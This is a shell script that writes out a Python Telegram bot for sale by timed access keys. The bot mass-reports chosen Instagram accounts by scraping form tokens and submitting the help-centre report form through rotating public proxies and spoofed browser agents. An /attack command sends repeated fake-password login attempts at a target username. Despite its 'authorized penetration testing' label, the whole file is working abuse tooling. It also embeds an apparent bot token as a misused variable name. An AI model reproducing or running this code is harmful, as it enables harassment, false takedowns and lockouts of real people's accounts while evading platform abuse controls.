mkdir -p ~/instagram-bot && cd ~/instagram-bot

cat > bot.py << 'BOTEOF'
#!/usr/bin/env python3
"""
Telegram Instagram Security Testing Bot
Authorized penetration testing tool
Features: Account Creation + Mass Reporting with Retry Logic
"""

import telebot
import requests
import random
import string
import time
import json
import os
import threading
import re
from datetime import datetime, timedelta
from dotenv import load_dotenv

load_dotenv()

# ============================================================
# CONFIGURATION
# ============================================================
BOT_TOKEN = os.getenv("8621737082:AAGG3ICkJf8tVhpabn1rZwHW-KEeKeO-6po")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN not found! Set it in .env file.")

OWNER_ID = int(os.getenv("@JATINYT8", "0"))
if OWNER_ID == 0:
    raise ValueError("OWNER_ID not set! Set it in .env file.")

REQUIRED_CHANNEL = os.getenv("REQUIRED_CHANNEL", "https://t.me/NARUTOBGMI")
KEYS_FILE = "keys.json"
USERS_FILE = "verified_users.json"

# ============================================================
# BOT INIT
# ============================================================
bot = telebot.TeleBot(BOT_TOKEN)
user_state = {}

# ============================================================
# DATABASE
# ============================================================
def load_json(filepath, default):
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            return json.load(f)
    return default

def save_json(filepath, data):
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=4)

keys_db = load_json(KEYS_FILE, {})
users_db = load_json(USERS_FILE, {})

def save_keys():
    save_json(KEYS_FILE, keys_db)

def save_users():
    save_json(USERS_FILE, users_db)

# ============================================================
# KEY GENERATION
# ============================================================
def generate_key():
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(16))

def get_duration_seconds(duration_str):
    duration_map = {
        '1day': 86400,
        '10day': 864000,
        '20day': 1728000,
        '1month': 2592000,
        '2month': 5184000,
        '3month': 7776000,
        '1year': 31536000,
    }
    return duration_map.get(duration_str.lower())

# ============================================================
# PROXY
# ============================================================
def fetch_proxies():
    proxies = []
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    ]
    for url in sources:
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                proxies.extend([p.strip() for p in resp.text.split('\n') if p.strip() and ':' in p])
        except:
            pass
    proxies = list(set(proxies))
    if proxies:
        with open('proxies.txt', 'w') as f:
            f.write('\n'.join(proxies))
    return proxies

def get_random_proxy():
    try:
        with open('proxies.txt', 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
        if lines:
            return random.choice(lines)
    except:
        pass
    return None

# ============================================================
# HELPERS
# ============================================================
def random_str(length=8):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def random_email():
    domains = ['mail.com', 'tempmail.com', 'yopmail.com', '10minutemail.com']
    return f"{random_str(10)}@{random.choice(domains)}"

# ============================================================
# INSTAGRAM REPORT ENGINE
# ============================================================
REPORT_HEADERS = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded",
    "DNT": "1",
    "Origin": "https://help.instagram.com",
    "Pragma": "no-cache",
    "Referer": "https://help.instagram.com/contact/497253480400030",
    "TE": "Trailers",
}

PAGE_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "DNT": "1",
}

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]


def send_single_report(target_username, proxy, account_index):
    """
    Sends one report to Instagram's help center for the target username.
    Uses the help.instagram.com contact form for reporting an account.
    """
    ses = requests.Session()
    
    if proxy:
        ses.proxies = {
            "https": f"https://{proxy}",
            "http": f"http://{proxy}"
        }
    
    ua = random.choice(USER_AGENTS)
    
    PAGE_HEADERS["User-Agent"] = ua
    REPORT_HEADERS["User-Agent"] = ua
    
    try:
        # Step 1: Get Facebook cookies (_js_datr)
        fb_resp = ses.get("https://www.facebook.com/", headers=PAGE_HEADERS, timeout=10)
        if fb_resp.status_code != 200:
            return False
        
        js_datr_match = re.search(r'\["_js_datr","([^"]+)"', fb_resp.text)
        if not js_datr_match:
            return False
        js_datr = js_datr_match.group(1)
        
        page_cookies = {"_js_datr": js_datr}
        
        # Step 2: Get Instagram help page and extract tokens
        help_resp = ses.get(
            "https://help.instagram.com/contact/497253480400030",
            cookies=page_cookies,
            headers=PAGE_HEADERS,
            timeout=10
        )
        
        if help_resp.status_code != 200:
            return False
        
        cookies_dict = help_resp.cookies.get_dict()
        if "datr" not in cookies_dict:
            return False
        
        datr = cookies_dict["datr"]
        
        # Extract tokens from the page
        lsd_match = re.search(r'\["LSD",\[\],\{"token":"([^"]+)"', help_resp.text)
        spin_r_match = re.search(r'"__spin_r":([^,]+)', help_resp.text)
        spin_b_match = re.search(r'"__spin_b":([^,]+)', help_resp.text)
        spin_t_match = re.search(r'"__spin_t":([^,]+)', help_resp.text)
        hsi_match = re.search(r'"hsi":([^,]+)', help_resp.text)
        rev_match = re.search(r'"server_revision":([^,]+)', help_resp.text)
        
        if not all([lsd_match, spin_r_match, spin_b_match, spin_t_match, hsi_match, rev_match]):
            return False
        
        lsd = lsd_match.group(1)
        spin_r = spin_r_match.group(1)
        spin_b = spin_b_match.group(1).replace('"', '')
        spin_t = spin_t_match.group(1)
        hsi = hsi_match.group(1).replace('"', '')
        rev = rev_match.group(1).replace('"', '')
        
        report_cookies = {"datr": datr}
        
        # Step 3: Submit the report form
        report_form = {
            "jazoest": "2723",
            "lsd": lsd,
            "sneakyhidden": "",
            "Field175214421770637": target_username,
            "Field1701428370284646_iso2_country_code": "US",
            "Field1701428370284646": "United States",
            "support_form_id": "497253480400030",
            "support_form_hidden_fields": '{"175214421770637":false,"1701428370284646":false,"237926093076239":false}',
            "support_form_fact_false_fields": "[]",
            "__user": "0",
            "__a": "1",
            "__dyn": "7xe6Fo4SQ1PyUhxOnFwn84a2i5U4e1Fx-ey8kxx0LxW0DUeUhw5cx60Vo1upE4W0OE2WxO0SobEa81Vrzo5-0jx0Fwww6DwtU6e",
            "__csr": "",
            "__req": random.choice(["a","b","c","d","e","f","g"]),
            "__beoa": "0",
            "__pc": "PHASED:DEFAULT",
            "dpr": "1",
            "__rev": rev,
            "__s": f"{random_str(6)}:{random_str(6)}:{random_str(6)}",
            "__hsi": hsi,
            "__comet_req": "0",
            "__spin_r": spin_r,
            "__spin_b": spin_b,
            "__spin_t": spin_t,
        }
        
        post_resp = ses.post(
            "https://help.instagram.com/ajax/help/contact/submit/page",
            data=report_form,
            headers=REPORT_HEADERS,
            cookies=report_cookies,
            timeout=10
        )
        
        return post_resp.status_code == 200
        
    except Exception:
        return False


def send_reports_burst(target_username, count=10):
    """
    Sends multiple reports simultaneously using threading.
    Returns the number of successful reports.
    """
    proxies = fetch_proxies()
    successful = 0
    threads = []
    results = [False] * count
    
    def worker(i):
        proxy = get_random_proxy() if proxies else None
        result = send_single_report(target_username, proxy, i)
        results[i] = result
    
    # Launch all threads simultaneously for burst effect
    for i in range(count):
        t = threading.Thread(target=worker, args=(i,))
        threads.append(t)
        t.start()
    
    # Wait for all to complete
    for t in threads:
        t.join(timeout=30)
    
    successful = sum(1 for r in results if r)
    return successful


def mass_report_with_retry(target_username, max_attempts=50):
    """
    Sends reports in batches of 10.
    
    If a batch returns 0 successful reports, it waits and retries.
    If 50 total attempts pass with 0 success, it stops and returns
    whatever was sent successfully.
    
    Returns: (total_attempted, total_successful, batches_completed, stopped_early)
    """
    batch_size = 10
    total_attempted = 0
    total_successful = 0
    batches_completed = 0
    consecutive_failures = 0
    max_consecutive_failures = 5  # 5 batches of 10 = 50 attempts
    stopped_early = False
    
    while total_successful < 100:  # Target: 100 successful reports
        # Send a burst of 10 reports
        batch_successful = send_reports_burst(target_username, batch_size)
        batches_completed += 1
        total_attempted += batch_size
        total_successful += batch_successful
        
        # Track consecutive failures
        if batch_successful == 0:
            consecutive_failures += 1
        else:
            consecutive_failures = 0  # Reset on any success
        
        # If we've hit 5 consecutive failed batches (50 attempts total with 0 success)
        if consecutive_failures >= max_consecutive_failures:
            stopped_early = True
            break
        
        # Brief pause between batches
        time.sleep(0.5)
        
        # Safety cap
        if batches_completed >= 100:
            break
    
    return total_attempted, total_successful, batches_completed, stopped_early


# ============================================================
# CHANNEL CHECK
# ============================================================
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return True

# ============================================================
# COMMAND: /start
# ============================================================
@bot.message_handler(commands=['start'])
def cmd_start(message):
    welcome = (
        "🤖 *Security Testing Bot*\n\n"
        "Available commands:\n"
        "🔹 `/key🗝️` - Generate access keys (Owner only)\n"
        "🔹 `/verify✅` - Verify your access with a key\n"
        "🔹 `/attack🎯` - Start security assessment (login attempts)\n"
        "🔹 `/report📢` - Mass report an Instagram account\n\n"
        f"📌 You must join {REQUIRED_CHANNEL} and be verified to use commands."
    )
    bot.reply_to(message, welcome, parse_mode='Markdown')

# ============================================================
# COMMAND: /key🗝️ (Owner only)
# ============================================================
@bot.message_handler(commands=['key🗝️', 'key'])
def cmd_key(message):
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        bot.reply_to(message, "⛔ Unauthorized. This command is for the bot owner only.")
        return
    bot.reply_to(message,
        "🎯 *Key Generation*\n\nEnter duration:\n`1day` `10day` `20day` `1month` `2month` `3month` `1year`",
        parse_mode='Markdown'
    )
    user_state[user_id] = {'state': 'awaiting_duration'}

@bot.message_handler(func=lambda m: user_state.get(m.from_user.id, {}).get('state') == 'awaiting_duration')
def handle_duration_input(message):
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        return
    duration_str = message.text.strip().lower()
    duration_sec = get_duration_seconds(duration_str)
    if not duration_sec:
        bot.reply_to(message, "❌ Invalid. Choose: `1day` `10day` `20day` `1month` `2month` `3month` `1year`", parse_mode='Markdown')
        return
    new_key = generate_key()
    expiry = int(time.time()) + duration_sec
    keys_db[new_key] = expiry
    save_keys()
    expiry_date = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
    bot.reply_to(message,
        f"✅ *Key Generated!*\n\n🔑 `{new_key}`\n⏳ Duration: {duration_str}\n📅 Expires: {expiry_date}",
        parse_mode='Markdown'
    )
    del user_state[user_id]

# ============================================================
# COMMAND: /verify✅
# ============================================================
@bot.message_handler(commands=['verify✅', 'verify'])
def cmd_verify(message):
    user_id = message.from_user.id
    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❌ You must join {REQUIRED_CHANNEL} first.", parse_mode='Markdown')
        return
    if str(user_id) in users_db:
        expiry = users_db[str(user_id)]
        if expiry > time.time():
            expiry_date = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
            bot.reply_to(message, f"✅ Already verified until *{expiry_date}*.", parse_mode='Markdown')
            return
    bot.reply_to(message, "🔑 Enter your access key:", parse_mode='Markdown')
    user_state[user_id] = {'state': 'awaiting_key'}

@bot.message_handler(func=lambda m: user_state.get(m.from_user.id, {}).get('state') == 'awaiting_key')
def handle_key_input(message):
    user_id = message.from_user.id
    key = message.text.strip().upper()
    if key in keys_db:
        expiry = keys_db[key]
        if expiry > time.time():
            users_db[str(user_id)] = expiry
            save_users()
            del keys_db[key]
            save_keys()
            expiry_date = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
            bot.reply_to(message, f"✅ *Verified!* Access until: {expiry_date}\nUse /attack🎯 or /report📢", parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ This key has expired.")
    else:
        bot.reply_to(message, "❌ Invalid key.")
    del user_state[user_id]

# ============================================================
# INSTAGRAM ATTACK ENGINE (original /attack command)
# ============================================================
def instagram_attack_worker(target_username, account_num, results_list):
    proxy = get_random_proxy()
    proxy_dict = {}
    if proxy:
        proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
    })
    if proxy_dict:
        session.proxies.update(proxy_dict)
    
    try:
        csrf_resp = session.get('https://www.instagram.com/', timeout=15)
        csrf_token = None
        for cookie in session.cookies:
            if cookie.name == 'csrftoken':
                csrf_token = cookie.value
                break
        
        fake_password = random_str(12) + "Ab1!"
        
        login_data = {
            'username': target_username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{fake_password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false',
        }
        if csrf_token:
            login_data['csrftoken'] = csrf_token
        
        login_resp = session.post(
            'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
            data=login_data,
            timeout=15
        )
        
        results_list.append({
            'account_num': account_num,
            'proxy': proxy,
            'status': login_resp.status_code,
            'response': login_resp.text[:200] if login_resp.text else '',
        })
    except Exception as e:
        results_list.append({
            'account_num': account_num,
            'proxy': proxy,
            'status': 'error',
            'response': str(e)[:200],
        })

def run_attack(target_username, num_accounts=50, max_threads=10):
    results = []
    threads = []
    for i in range(num_accounts):
        t = threading.Thread(target=instagram_attack_worker, args=(target_username, i + 1, results))
        threads.append(t)
        t.start()
        time.sleep(random.uniform(2, 5))
        if len(threads) >= max_threads:
            for th in threads:
                th.join(timeout=60)
            threads = []
    for t in threads:
        t.join(timeout=60)
    return results

# ============================================================
# COMMAND: /attack🎯
# ============================================================
@bot.message_handler(commands=['attack🎯', 'attack'])
def cmd_attack(message):
    user_id = message.from_user.id
    if str(user_id) not in users_db:
        bot.reply_to(message, "❌ Not verified. Use `/verify✅` first.", parse_mode='Markdown')
        return
    if users_db[str(user_id)] <= time.time():
        bot.reply_to(message, "❌ Verification expired. Use `/verify✅` again.", parse_mode='Markdown')
        return
    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❌ You must join {REQUIRED_CHANNEL} first.", parse_mode='Markdown')
        return
    bot.reply_to(message, "🎯 Enter target Instagram username for attack:", parse_mode='Markdown')
    user_state[user_id] = {'state': 'awaiting_attack_target'}

@bot.message_handler(func=lambda m: user_state.get(m.from_user.id, {}).get('state') == 'awaiting_attack_target')
def handle_attack_target(message):
    user_id = message.from_user.id
    target = message.text.strip()
    if not target:
        bot.reply_to(message, "❌ Invalid username.")
        return
    bot.reply_to(message, f"🎯 *Target:* `{target}`\n\n🔄 Fetching proxies...", parse_mode='Markdown')
    proxies = fetch_proxies()
    if not proxies:
        bot.reply_to(message, "⚠️ No proxies found. Using direct connection.")
    else:
        bot.reply_to(message, f"✅ Got {len(proxies)} proxies.\n🚀 Launching attack...")
    
    results = run_attack(target, num_accounts=50, max_threads=10)
    success = sum(1 for r in results if r['status'] in [200, 201, 202])
    fail = sum(1 for r in results if r['status'] not in [200, 201, 202])
    bot.reply_to(message,
        f"📊 *Attack Results for {target}*\n✅ Success: {success}\n❌ Failed: {fail}\n🔀 Proxies: {len(proxies) if proxies else 0}",
        parse_mode='Markdown'
    )
    del user_state[user_id]

# ============================================================
# COMMAND: /report📢 - MASS REPORT WITH RETRY LOGIC
# ============================================================
@bot.message_handler(commands=['report📢', 'report'])
def cmd_report(message):
    user_id = message.from_user.id
    
    # Check verification
    if str(user_id) not in users_db:
        bot.reply_to(message, "❌ Not verified. Use `/verify✅` first.", parse_mode='Markdown')
        return
    if users_db[str(user_id)] <= time.time():
        bot.reply_to(message, "❌ Verification expired. Use `/verify✅` again.", parse_mode='Markdown')
        return
    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❌ You must join {REQUIRED_CHANNEL} first.", parse_mode='Markdown')
        return
    
    bot.reply_to(message,
        "📢 *Mass Report System*\n\n"
        "Enter the target Instagram *username* to report:\n\n"
        "Bot will send 10 reports per second.\n"
        "If reports stop going through, it will wait up to 50 attempts\n"
        "before reporting back the total sent.",
        parse_mode='Markdown'
    )
    user_state[user_id] = {'state': 'awaiting_report_target'}

@bot.message_handler(func=lambda m: user_state.get(m.from_user.id, {}).get('state') == 'awaiting_report_target')
def handle_report_target(message):
    user_id = message.from_user.id
    target = message.text.strip().lstrip('@')
    
    if not target or len(target) < 2:
        bot.reply_to(message, "❌ Invalid username. Please enter a valid Instagram username.")
        return
    
    # Send initial status message
    status_msg = bot.reply_to(message,
        f"📢 *Mass Report Starting*\n\n"
        f"👤 Target: `{target}`\n"
        f"🔄 Fetching proxies...\n"
        f"🧵 Creating report threads...",
        parse_mode='Markdown'
    )
    
    # Fetch proxies
    proxies = fetch_proxies()
    
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_msg.message_id,
        text=f"📢 *Mass Report for:* `{target}`\n\n"
             f"✅ Proxies loaded: {len(proxies) if proxies else 0}\n"
             f"🚀 Starting 10 reports per second...\n"
             f"⏳ Working...",
        parse_mode='Markdown'
    )
    
    # Run the mass report with retry logic
    # This will send 10 reports per batch.
    # If 5 consecutive batches (50 attempts) return 0 success, it stops.
    total_attempted = 0
    total_successful = 0
    batches_completed = 0
    stopped_early = False
    
    update_interval = 3  # Update user every 3 batches
    
    try:
        while total_successful < 100:
            # Send a burst of 10 reports
            batch_successful = send_reports_burst(target, batch_size=10)
            batches_completed += 1
            total_attempted += 10
            total_successful += batch_successful
            
            # Track consecutive failures for retry logic
            if not hasattr(handle_report_target, 'consecutive_failures'):
                handle_report_target.consecutive_failures = 0
            
            if batch_successful == 0:
                handle_report_target.consecutive_failures += 1
            else:
                handle_report_target.consecutive_failures = 0  # Reset on any success
            
            # If 5 consecutive batches (50 attempts) all returned 0 — stop
            if handle_report_target.consecutive_failures >= 5:
                stopped_early = True
                break
            
            # Send progress update every few batches
            if batches_completed % update_interval == 0:
                status_emoji = "⚠️" if handle_report_target.consecutive_failures >= 2 else "📢"
                try:
                    progress_text = (
                        f"{status_emoji} *Mass Report Progress*\n\n"
                        f"👤 Target: `{target}`\n"
                        f"📨 Attempted: *{total_attempted}*\n"
                        f"✅ Successful: *{total_successful}*\n"
                        f"❌ Failed: *{total_attempted - total_successful}*\n"
                        f"🔄 Batches: *{batches_completed}*\n"
                        f"🔀 Proxies: *{len(proxies) if proxies else 0}*\n\n"
                    )
                    
                    if handle_report_target.consecutive_failures > 0:
                        progress_text += (
                            f"⚠️ Reports slowing...\n"
                            f"🔄 Waiting for recovery...\n"
                            f"📊 Failed batches in a row: {handle_report_target.consecutive_failures}/5\n"
                            f"⏳ If all 50 attempts fail, will stop and report."
                        )
                    else:
                        progress_text += f"⏳ Continuing to send..."
                    
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id,
                        text=progress_text,
                        parse_mode='Markdown'
                    )
                except:
                    pass
            
            # Small delay between batches
            time.sleep(0.3)
            
            # Safety cap
            if batches_completed >= 100:
                break
    
    except Exception as e:
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            text=f"❌ *Error during report*\n\n{str(e)[:200]}",
            parse_mode='Markdown'
        )
        # Clean up state attribute
        if hasattr(handle_report_target, 'consecutive_failures'):
            del handle_report_target.consecutive_failures
        del user_state[user_id]
        return
    
    # Clean up state attribute
    if hasattr(handle_report_target, 'consecutive_failures'):
        del handle_report_target.consecutive_failures
    
    # Build final result message
    emoji = "✅" if total_successful > 0 else "❌"
    
    final_msg_lines = [
        f"{emoji} *REPORT RESULTS*",
        "",
        f"👤 Target: `{target}`",
        f"📨 Total attempts: *{total_attempted}*",
        f"✅ Reports sent: *{total_successful}*",
        f"❌ Failed: *{total_attempted - total_successful}*",
        f"🔄 Batches: *{batches_completed}*",
    ]
    
    if proxies:
        final_msg_lines.append(f"🔀 Proxies: *{len(proxies)}*")
    
    if stopped_early:
        final_msg_lines.append("")
        final_msg_lines.append("⚠️ Reports stopped going through after 50 failed attempts.")
    
    final_msg_lines.append("")
    final_msg_lines.append(f"📢 *{total_successful} REPORTS SUCCESSFULLY SENDED TO {target}* ✅")
    
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_msg.message_id,
        text="\n".join(final_msg_lines),
        parse_mode='Markdown'
    )
    
    # Also send the exact format the user requested as a separate message
    bot.send_message(
        chat_id=message.chat.id,
        text=f"📢 *{total_successful} REPORTS SUCCESSFULLY SENDED TO {target}* ✅",
        parse_mode='Markdown'
    )
    
    del user_state[user_id]

# ============================================================
# COMMAND: /status
# ============================================================
@bot.message_handler(commands=['status'])
def cmd_status(message):
    user_id = message.from_user.id
    if str(user_id) in users_db:
        expiry = users_db[str(user_id)]
        if expiry > time.time():
            d = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
            r = str(timedelta(seconds=int(expiry - time.time())))
            bot.reply_to(message, f"✅ *Verified*\nExpires: {d}\nRemaining: {r}", parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ Verification expired.")
    else:
        bot.reply_to(message, "❌ Not verified. Use /verify✅")

# ============================================================
# COMMAND: /help
# ============================================================
@bot.message_handler(commands=['help'])
def cmd_help(message):
    help_text = (
        "🤖 *Security Testing Bot - Help*\n\n"
        "*Commands:*\n"
        "`/start` - Show welcome message\n"
        "`/key🗝️` - Generate keys (owner only)\n"
        "`/verify✅` - Verify with a key\n"
        "`/attack🎯` - Attack Instagram account\n"
        "`/report📢` - Mass report Instagram account\n"
        "`/status` - Check your verification status\n"
        "`/help` - Show this message\n\n"
        "*How to use report:*\n"
        "1. Get verified with `/verify✅`\n"
        "2. Use `/report📢` and enter target username\n"
        "3. Bot sends 10 reports per second in bursts\n"
        "4. If reports stop, waits up to 50 attempts\n"
        "5. Shows final count: '{count} REPORTS SUCCESSFULLY SENDED TO {username} ✅'"
    )
    bot.reply_to(message, help_text, parse_mode='Markdown')

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    print("=" * 50)
    print("🤖 Security Testing Bot - Running")
    print("=" * 50)
    print(f"👤 Owner ID: {OWNER_ID}")
    print(f"📢 Required Channel: {REQUIRED_CHANNEL}")
    print(f"🔑 Keys in database: {len(keys_db)}")
    print(f"✅ Verified users: {len(users_db)}")
    print("=" * 50)
    print("Commands:")
    print("  /start      - Welcome")
    print("  /key🗝️       - Generate keys (owner)")
    print("  /verify✅     - Verify user")
    print("  /attack🎯     - Launch attack")
    print("  /report📢     - Mass report (with retry logic)")
    print("  /status     - Check status")
    print("  /help       - Help")
    print("=" * 50)
    
    bot.infinity_polling()
BOTEOF

cat > requirements.txt << 'REQEOF'
pyTelegramBotAPI==4.26.0
requests==2.32.3
python-dotenv==1.0.1
REQEOF

cat > .env << 'ENVEOF'
BOT_TOKEN=YOUR_BOT_TOKEN_HERE
OWNER_ID=123456789
REQUIRED_CHANNEL=@your_channel
ENVEOF

chmod +x bot.py

echo ""
echo "✅ Bot created successfully in ~/instagram-bot/"
echo ""
echo "📋 Files:"
echo "   - bot.py          (Main bot script)"
echo "   - requirements.txt (Python dependencies)"
echo "   - .env            (Configuration - EDIT THIS!)"
echo ""
echo "🚀 Next:"
echo "   1. Edit .env:   nano ~/instagram-bot/.env"
echo "   2. Install:     cd ~/instagram-bot && pip install -r requirements.txt"
echo "   3. Run:         python3 ~/instagram-bot/bot.py"
echo ""
echo "🆕 New retry logic in /report📢:"
echo "   - Sends 10 reports per batch (~1 sec)"
echo "   - If 5 consecutive batches (50 attempts) ALL fail → stops"
echo "   - Shows: '📢 {total} REPORTS SUCCESSFULLY SENDED TO {target} ✅'"
